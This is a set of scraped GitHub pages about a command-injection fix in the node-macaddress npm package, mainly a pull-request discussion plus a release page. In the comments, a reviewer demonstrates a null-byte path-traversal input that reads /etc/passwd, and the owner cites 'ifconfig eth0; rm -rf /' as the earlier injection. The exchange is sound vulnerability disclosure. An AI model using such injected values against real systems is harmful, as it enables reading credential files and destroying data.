=== Content from github.com_8988582b_20250125_131430.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Fpull%2F20%2F)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Fpull%2F20%2F)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=scravy%2Fnode-macaddress)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[scravy](/scravy)
/
**[node-macaddress](/scravy/node-macaddress)**
Public

* [Notifications](/login?return_to=%2Fscravy%2Fnode-macaddress) You must be signed in to change notification settings
* [Fork
  39](/login?return_to=%2Fscravy%2Fnode-macaddress)
* [Star
   143](/login?return_to=%2Fscravy%2Fnode-macaddress)

* [Code](/scravy/node-macaddress)
* [Issues
  2](/scravy/node-macaddress/issues)
* [Pull requests
  1](/scravy/node-macaddress/pulls)
* [Actions](/scravy/node-macaddress/actions)
* [Projects
  0](/scravy/node-macaddress/projects)
* [Wiki](/scravy/node-macaddress/wiki)
* [Security](/scravy/node-macaddress/security)
* [Insights](/scravy/node-macaddress/pulse)

Additional navigation options

* [Code](/scravy/node-macaddress)
* [Issues](/scravy/node-macaddress/issues)
* [Pull requests](/scravy/node-macaddress/pulls)
* [Actions](/scravy/node-macaddress/actions)
* [Projects](/scravy/node-macaddress/projects)
* [Wiki](/scravy/node-macaddress/wiki)
* [Security](/scravy/node-macaddress/security)
* [Insights](/scravy/node-macaddress/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fscravy%2Fnode-macaddress%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fscravy%2Fnode-macaddress%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Fixes arbitrary command injection by using execFile instead of exec #20

 Merged

[scravy](/scravy)
merged 5 commits into
[scravy:master](/scravy/node-macaddress/tree/master "scravy/node-macaddress:master")
from
[flypapertech:fixCommandInjection](/flypapertech/node-macaddress/tree/fixCommandInjection "flypapertech/node-macaddress:fixCommandInjection")

Jun 23, 2018

 Merged

# [Fixes arbitrary command injection by using execFile instead of exec](#top) #20

[scravy](/scravy)
merged 5 commits into
[scravy:master](/scravy/node-macaddress/tree/master "scravy/node-macaddress:master")
from
[flypapertech:fixCommandInjection](/flypapertech/node-macaddress/tree/fixCommandInjection "flypapertech/node-macaddress:fixCommandInjection")

Jun 23, 2018

[Conversation
13](/scravy/node-macaddress/pull/20)
[Commits
5](/scravy/node-macaddress/pull/20/commits)
[Checks
0](/scravy/node-macaddress/pull/20/checks)
[Files changed](/scravy/node-macaddress/pull/20/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![Logikgate](https://avatars.githubusercontent.com/u/2379994?s=60&v=4)](/Logikgate)

Copy link

Contributor

### @Logikgate **[Logikgate](/Logikgate)** commented [May 30, 2018](#issue-327768286)

Note: this is the same as PR [#18](https://github.com/scravy/node-macaddress/pull/18), replaced to allow further development on our fork's master branch

execFile takes the call arguments as variables and they are not executed under the shell environment

Reference

<https://blog.liftsecurity.io/2014/08/19/Avoid-Command-Injection-Node.js/>

Sorry, something went wrong.

All reactions

 [Logikgate](/Logikgate)
added 5 commits
[May 14, 2018 17:43](#commits-pushed-99b23e6)

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=40&v=4)](/Logikgate)

`[Fix arbitrary command injection, CWE-264](/scravy/node-macaddress/pull/20/commits/99b23e61c791921ed90c1bc4c186f31fd405aecf "Fix arbitrary command injection, CWE-264")`

`[99b23e6](/scravy/node-macaddress/pull/20/commits/99b23e61c791921ed90c1bc4c186f31fd405aecf)`

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=40&v=4)](/Logikgate)

`[remove unused macos implementation, unix covers it](/scravy/node-macaddress/pull/20/commits/d55bb29c645052ad293d836ea5810f1b1ef757ba "remove unused macos implementation, unix covers it")`

`[d55bb29](/scravy/node-macaddress/pull/20/commits/d55bb29c645052ad293d836ea5810f1b1ef757ba)`

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=40&v=4)](/Logikgate)

`[Fixes arbitrary command execution](/scravy/node-macaddress/pull/20/commits/b2124ef35549ec08d97515360d18aefae13d204d "Fixes arbitrary command execution")`

`[b2124ef](/scravy/node-macaddress/pull/20/commits/b2124ef35549ec08d97515360d18aefae13d204d)`

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=40&v=4)](/Logikgate)

`[Fix for Node 0.8 thru 0.10](/scravy/node-macaddress/pull/20/commits/7b0a488dab62c7258d9a3bdc0d6a72b803d9c717 "Fix for Node 0.8 thru 0.10")`

`[7b0a488](/scravy/node-macaddress/pull/20/commits/7b0a488dab62c7258d9a3bdc0d6a72b803d9c717)`

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=40&v=4)](/Logikgate)

`[Run travis against osx and linux, travis doesn't do windows](/scravy/node-macaddress/pull/20/commits/214ad005bc8612f40eab9a2006e0e2ea0bd16cc1 "Run travis against osx and linux, travis doesn't do windows")`

`[214ad00](/scravy/node-macaddress/pull/20/commits/214ad005bc8612f40eab9a2006e0e2ea0bd16cc1)`

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=40&v=4)](/Logikgate)
[Logikgate](/Logikgate)
mentioned this pull request
[May 30, 2018](#ref-pullrequest-322994477)

[Fixes arbitrary command injection by using execFile instead of exec
#18](/scravy/node-macaddress/pull/18)
 Closed

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=80&v=4)](/Logikgate)

Copy link

Contributor

Author

### **[Logikgate](/Logikgate)** commented [May 30, 2018](#issuecomment-393202703)

| Since it appears this repo is abandoned, I have published a new npm module based on [our fork](https://github.com/flypapertech/node-macaddress). This fork will be maintained for security fixes and will be open to feature pull requests from the community.  You can use it with: `npm install macaddress-secure` or `yarn add macaddress-secure`  Also, if you're using yarn you can force your sub-modules to use this package by adding the below to your package.json `"resolutions":` { `"*/**/macaddress": "macaddress-secure^0.2.11" }` |
| --- |

 👎
1
 q3k reacted with thumbs down emoji

All reactions

* 👎
  1 reaction

Sorry, something went wrong.

[![@q3k](https://avatars.githubusercontent.com/u/315234?s=80&v=4)](/q3k)

Copy link

### **[q3k](/q3k)** commented [Jun 11, 2018](#issuecomment-396265200) • edited Loading

| This is still vulnerable to arbitrary file read:  ``` > let execFile = require('child_process').execFile; undefined > let garbage = function (iface, callback) { ...     execFile("cat", ["/sys/class/net/" + iface + "/address"], function (err, out) { .....         if (err) { .......             callback(err, null); .......             return; .......         } .....         callback(null, out.trim().toLowerCase()); .....     }); ... }; undefined > garbage("../../../../etc/passwd\x00", (e, o) => { console.log(o); }) undefined > root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:mailing list manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:gnats bug-reporting system (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd time synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd network management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd bus proxy,,,:/run/systemd:/bin/false node:x:1000:1000::/home/node:/bin/bash  >  ```  I recommend at least using a proper file read function which will panic on null bytes and to manually filter out any pathseps from the given iface:  ``` > require('fs').readFile('/sys/class/net/../../../../../etc/passwd\x00/address', (e, o) => { console.log(o); }) TypeError [ERR_INVALID_ARG_VALUE]: The argument 'path' must be a string or Uint8Array without null bytes. Received '/sys/class/net/../../../../../etc/passwd\u0000/address'     at Object.fs.readFile (fs.js:291:3) ```  or even better, using real APIs to access network device information (ie. Netlink on Linux). |
| --- |

 👍
9
 MiniGod, arachnist, kirinrastogi, BeauBouchard, towerofnix, checor, KevOrr, tiomno, and DrewDennison reacted with thumbs up emoji

All reactions

* 👍
  9 reactions

Sorry, something went wrong.

[![@q3k](https://avatars.githubusercontent.com/u/315234?s=80&v=4)](/q3k)

Copy link

### **[q3k](/q3k)** commented [Jun 14, 2018](#issuecomment-397277681)

| [@Logikgate](https://github.com/Logikgate) ping, check out the above cf. your fork ^  (I have to mention you here, because your '-secure' repo has GH Issues disabled ?!) |
| --- |

 👍
1
 epet reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![@epet](https://avatars.githubusercontent.com/u/11894599?s=80&u=a4f75f853a675b5d798758c51e90f16fc71df653&v=4)](/epet)

Copy link

### **[epet](/epet)** commented [Jun 22, 2018](#issuecomment-399475582)

| [@Logikgate](https://github.com/Logikgate), would you enable issues/discussions on your repo, please. |
| --- |

All reactions

Sorry, something went wrong.

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=80&v=4)](/Logikgate)

Copy link

Contributor

Author

### **[Logikgate](/Logikgate)** commented [Jun 22, 2018](#issuecomment-399477252)

| [@epet](https://github.com/epet), [@q3k](https://github.com/q3k) I've enabled issues, sorry about that. [@q3k](https://github.com/q3k) I'll take a look at removing cat completely soon here |
| --- |

 🎉
2
 epet and DrewDennison reacted with hooray emoji

All reactions

* 🎉
  2 reactions

Sorry, something went wrong.

[![@epet](https://avatars.githubusercontent.com/u/11894599?s=80&u=a4f75f853a675b5d798758c51e90f16fc71df653&v=4)](/epet)

Copy link

### **[epet](/epet)** commented [Jun 22, 2018](#issuecomment-399484180) • edited Loading

| [@q3k](https://github.com/q3k), [@Logikgate](https://github.com/Logikgate), copied issue [@q3k](https://github.com/q3k) reported to [flypapertech#1](https://github.com/flypapertech/node-macaddress/issues/1) |
| --- |

All reactions

Sorry, something went wrong.

[![@scravy](https://avatars.githubusercontent.com/u/295504?s=40&u=2a4edf68591d46bd1020f83e83b156ef510cc194&v=4)](/scravy)
[scravy](/scravy)
merged commit [`358fd59`](/scravy/node-macaddress/commit/358fd594adb196a86b94ac9c691f69fe5dad2332)
into
scravy:master

[Jun 23, 2018](https://github.com/scravy/node-macaddress/pull/20#event-1697403255)

[![@scravy](https://avatars.githubusercontent.com/u/295504?s=80&u=2a4edf68591d46bd1020f83e83b156ef510cc194&v=4)](/scravy)

Copy link

Owner

### **[scravy](/scravy)** commented [Jun 23, 2018](#issuecomment-399715622)

| Hi everyone,  thank you for the discussion and the PR which I merged way to late. Friends brought it to my attention that this issue has even been brought up at <https://news.ycombinator.com/item?id=17283394>  Sorry for the seemingly abandonness of this project, I took care of a few pull requests and am releasing a new version right away. |
| --- |

 🎉
3
 erikj180, jourdanrodrigues, and tiomno reacted with hooray emoji

All reactions

* 🎉
  3 reactions

Sorry, something went wrong.

[![@scravy](https://avatars.githubusercontent.com/u/295504?s=40&u=2a4edf68591d46bd1020f83e83b156ef510cc194&v=4)](/scravy)
[scravy](/scravy)
mentioned this pull request
[Jun 24, 2018](#ref-issue-323582565)

[Arbitrary Command Injection
#19](/scravy/node-macaddress/issues/19)

Closed

[![@epet](https://avatars.githubusercontent.com/u/11894599?s=80&u=a4f75f853a675b5d798758c51e90f16fc71df653&v=4)](/epet)

Copy link

### **[epet](/epet)** commented [Jun 25, 2018](#issuecomment-400019945)

| thanks [@Logikgate](https://github.com/Logikgate) for fixing and [@scravy](https://github.com/scravy) for resurfacing! |
| --- |

All reactions

Sorry, something went wrong.

[![@kwbBaker](https://avatars.githubusercontent.com/u/40439595?s=80&v=4)](/kwbBaker)

Copy link

### **[kwbBaker](/kwbBaker)** commented [Jul 3, 2018](#issuecomment-402171940)

| Sorry to interject since I don't really belong here (just a package user) but... I have a usage of uuid-1345 that in turn uses macaddress, and it gives an error where macaddress code has a "require('child\_process')". I believe this was the fix, right? I mean, to use execFile, which needs child\_process. Shouldn't this package somehow indicate that it has a dependency on this 'child\_process' package? Ideally you shouldn't have to manually figure this out and install it, but for me at least, the story doesn't end there: manually doing "npm install --save child\_process" is not sufficient to get the reference to resolve. |
| --- |

All reactions

Sorry, something went wrong.

[![@scravy](https://avatars.githubusercontent.com/u/295504?s=80&u=2a4edf68591d46bd1020f83e83b156ef510cc194&v=4)](/scravy)

Copy link

Owner

### **[scravy](/scravy)** commented [Jul 3, 2018](#issuecomment-402305951)

| @kwbskf Could you open an issue for that on the uuid package? I will have a look in the weekend. |
| --- |

All reactions

Sorry, something went wrong.

[![@kwbBaker](https://avatars.githubusercontent.com/u/40439595?s=80&v=4)](/kwbBaker)

Copy link

### **[kwbBaker](/kwbBaker)** commented [Jul 5, 2018](#issuecomment-402760258)

| done; but it seems more like an issue with macaddress and how it references child\_process, though it might have more to do with something amiss in my configuration |
| --- |

All reactions

Sorry, something went wrong.

[![javabudd](https://avatars.githubusercontent.com/u/611826?s=60&v=4)](/javabudd)

**[javabudd](/javabudd)**
reviewed
[Sep 24, 2018](#pullrequestreview-158302987)

 [View reviewed changes](/scravy/node-macaddress/pull/20/files/214ad005bc8612f40eab9a2006e0e2ea0bd16cc1)

[lib/unix.js](/scravy/node-macaddress/pull/20/files/214ad005bc8612f40eab9a2006e0e2ea0bd16cc1#diff-065eaf69638f20ea2a76fe2137bbe81eedc43f2d7c91395b0b6a4c01cde93321)

|  |  |  |
| --- | --- | --- |
|  |  | module.exports = function (iface, callback) { |
|  |  | exec("ifconfig " + iface, function (err, out) { |
|  |  | execFile("ifconfig", [iface], function (err, out) { |

Copy link

### @javabudd **[javabudd](/javabudd)** [Sep 24, 2018](#discussion_r219995225) • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

If `iface` isn't properly sanitized, wouldn't this still be vulnerable?

`ifconfig eth0 down`

Sorry, something went wrong.

All reactions

Copy link

Owner

### @scravy **[scravy](/scravy)** [Oct 1, 2018](#discussion_r221583687)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

[@javabudd](https://github.com/javabudd) No. `execFile` does not invoke a command interpreter / shell (unless an options dict with `shell` is passed, but the `shell` option defaults to `false`). The command is not simply concatenated with spaces and then interpreted again. Your example would yield `ifconfig 'eth0 down'` which is not two arguments `eth0` and `down` but one argument `etc0 down` which ifconfig will not find an interface for.

The previous vulnerability was that exec indeed does interpret the command and you could have done things like `ifconfig eth0; rm -rf /`. This is properly solved.

Sorry, something went wrong.

 👍
1
 xiaoxiangmoe reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

This was referenced Mar 11, 2021

[Bump macaddress from 0.2.8 to 0.2.9
FCU-iOSClub/RTC-website#58](/FCU-iOSClub/RTC-website/pull/58)
 Open

[Bump macaddress from 0.2.8 to 0.2.9 in /Assignments/Assignment1/base-syntax--assignment-problem
svwoodhouse/ReactJS-CompleteGuide#5](/svwoodhouse/ReactJS-CompleteGuide/pull/5)
 Merged

[Bump macaddress from 0.2.8 to 0.2.9
jonwho/resume#15](/jonwho/resume/pull/15)
 Open

[Bump macaddress from 0.2.8 to 0.2.9
sagelga/prepro60#6](/sagelga/prepro60/pull/6)
 Closed

[Bump macaddress from 0.2.8 to 0.2.9
aclark4life/test-django-webpack#2](/aclark4life/test-django-webpack/pull/2)
 Merged

[![@debricked-staging](https://avatars.githubusercontent.com/u/40488434?s=40&v=4)](/apps/debricked-staging)
[debricked-staging](/apps/debricked-staging)
bot
mentioned this pull request
[Dec 5, 2023](#ref-pullrequest-2026446510)

[Fix CVE–2018–13797
InternalBenchmarkDebricked/yarn#8](/InternalBenchmarkDebricked/yarn/pull/8)
 Open

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Fpull%2F20%2F)

Reviewers

[![@javabudd](https://avatars.githubusercontent.com/u/611826?s=40&v=4)](/javabudd) [javabudd](/javabudd)

javabudd left review comments

[![@scravy](https://avatars.githubusercontent.com/u/295504?s=40&v=4)](/scravy) [scravy](/scravy)

scravy left review comments

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

7 participants

[![@Logikgate](https://avatars.githubusercontent.com/u/2379994?s=52&v=4)](/Logikgate) [![@q3k](https://avatars.githubusercontent.com/u/315234?s=52&v=4)](/q3k) [![@epet](https://avatars.githubusercontent.com/u/11894599?s=52&v=4)](/epet) [![@scravy](https://avatars.githubusercontent.com/u/295504?s=52&v=4)](/scravy) [![@kwbBaker](https://avatars.githubusercontent.com/u/40439595?s=52&v=4)](/kwbBaker) [![@javabudd](https://avatars.githubusercontent.com/u/611826?s=52&v=4)](/javabudd) [![@mikroskeem](https://avatars.githubusercontent.com/u/3490861?s=52&v=4)](/mikroskeem)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_c8e37b62_20250125_131431.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Freleases%2Ftag%2F0.2.9)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Freleases%2Ftag%2F0.2.9)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=scravy%2Fnode-macaddress)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[scravy](/scravy)
/
**[node-macaddress](/scravy/node-macaddress)**
Public

* [Notifications](/login?return_to=%2Fscravy%2Fnode-macaddress) You must be signed in to change notification settings
* [Fork
  39](/login?return_to=%2Fscravy%2Fnode-macaddress)
* [Star
   143](/login?return_to=%2Fscravy%2Fnode-macaddress)

* [Code](/scravy/node-macaddress/tree/0.2.9)
* [Issues
  2](/scravy/node-macaddress/issues)
* [Pull requests
  1](/scravy/node-macaddress/pulls)
* [Actions](/scravy/node-macaddress/actions)
* [Projects
  0](/scravy/node-macaddress/projects)
* [Wiki](/scravy/node-macaddress/wiki)
* [Security](/scravy/node-macaddress/security)
* [Insights](/scravy/node-macaddress/pulse)

Additional navigation options

* [Code](/scravy/node-macaddress/tree/0.2.9)
* [Issues](/scravy/node-macaddress/issues)
* [Pull requests](/scravy/node-macaddress/pulls)
* [Actions](/scravy/node-macaddress/actions)
* [Projects](/scravy/node-macaddress/projects)
* [Wiki](/scravy/node-macaddress/wiki)
* [Security](/scravy/node-macaddress/security)
* [Insights](/scravy/node-macaddress/pulse)

1. [Releases](/scravy/node-macaddress/releases)
2. [0.2.9](/scravy/node-macaddress/releases/tag/0.2.9)

# v0.2.9

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/scravy/node-macaddress/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...0.2.9)

 Loading

[View all tags](/scravy/node-macaddress/tags)

![@scravy](https://avatars.githubusercontent.com/u/295504?s=40&v=4)
[scravy](/scravy)
released this
23 Jun 23:01

·
[60 commits](/scravy/node-macaddress/compare/0.2.9...master)
to master
since this release

[0.2.9](/scravy/node-macaddress/tree/0.2.9)

[`3379146`](/scravy/node-macaddress/commit/3379146455636d8e86ccb20fbff2912032d74e66)

This commit was created on GitHub.com and signed with GitHub’s **verified signature**.
The key has expired.

GPG key ID: 4AEE18F83AFDEB23
Expired

[Learn about vigilant mode](https://docs.github.com/github/authenticating-to-github/displaying-verification-statuses-for-all-of-your-commits).

* Fixes an arbitrary command execution vulnerability (<https://github.com/scravy/node-macaddress/pull/16/files>)
* Adds support for `freebsd`
* Fixes a few typos

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_5a52b5ab_20250125_131428.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fscravy%2Fnode-macaddress%2Fcommit%2F358fd594adb196a86b94ac9c691f69fe5dad2332)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
